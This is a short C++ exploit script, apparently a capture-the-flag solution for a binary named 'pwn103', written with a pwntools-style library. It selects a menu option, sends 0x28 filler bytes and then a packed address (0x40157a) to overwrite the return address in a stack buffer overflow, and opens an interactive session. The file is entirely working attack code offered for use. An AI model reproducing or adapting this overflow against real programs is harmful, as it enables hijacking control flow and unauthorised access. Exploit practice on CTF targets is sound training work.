//exp103.cpp
#include <string>
#include <iostream>
#include <pwntools>

int main(){
    using namespace pwn;
    Process p{"./pwn103",NULL,0};
    p.set_debug(true);
    p.recvuntil(":");
    std::string channel="3";
    p.sendline(channel);
    p.recvuntil(":");
    std::string payload;
    for(int i=0;i<0x28;i++) payload.append(hex2string(0x90));
    payload += p64(0x40157a);
    p.sendline(payload);
    p.interactive();
}